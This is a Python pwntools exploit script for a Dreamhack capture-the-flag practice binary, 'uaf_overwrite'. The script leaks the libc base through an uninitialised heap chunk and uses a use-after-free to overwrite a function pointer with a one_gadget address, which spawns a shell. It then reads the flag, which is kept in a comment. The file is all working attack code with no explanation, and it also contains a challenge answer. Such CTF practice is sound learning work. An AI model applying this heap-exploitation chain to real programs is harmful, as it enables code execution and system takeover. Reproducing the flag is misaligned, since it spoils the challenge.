#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'uaf_overwrite_patched'
HOST = 'host8.dreamhack.games'
PORT = 18273

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0xce1
brva 0x961
brva 0x9ea
brva 0x9fb  
brva 0xaa6
brva 0xb2c
brva 0xc26
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def human(weight, age):
    sla(b'> ', b'1')
    sla(b'Weight: ', str(weight).encode())
    sla(b'Age: ', str(age).encode())
    # free(human)
def robot(weight):
    sla(b'> ', b'2')
    sla(b'Weight: ', str(weight).encode())
    # pointer instead of age
    # free(robot)
def custom(size, data, idx):
    sla(b'> ', b'3')
    sla(b'Size: ', str(size).encode())
    sa(b'Data: ', data) # only if size >= 0x100
    sla(b'Free idx: ', str(idx).encode()) # only if idx < 10

custom(0x418, b'A'*0x10, 10)
human(0x100, 0x20) # chunk 0
custom(0x418, b'B'*0x10, 0)

sla(b'> ', b'3')
sla(b'Size: ', str(0x418).encode())
sa(b'Data: ', b'C'*0x8)
rcu(b'C'*0x8)
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x3ebca0
log.success(f'libc base: {hex(libc.address)}')
one_gadget = 0x10a41c + libc.address
sla(b'Free idx: ', b'10')
human(0x100, one_gadget) # overwrite robot->name with one_gadget
robot(0x100) # trigger print_name and get shell
sl(b'cat flag*')
# DH{130dbd07d09a0dc093c29171c7178545aa9641af8384fea4942d9952ed1b9acd}
p.interactive()
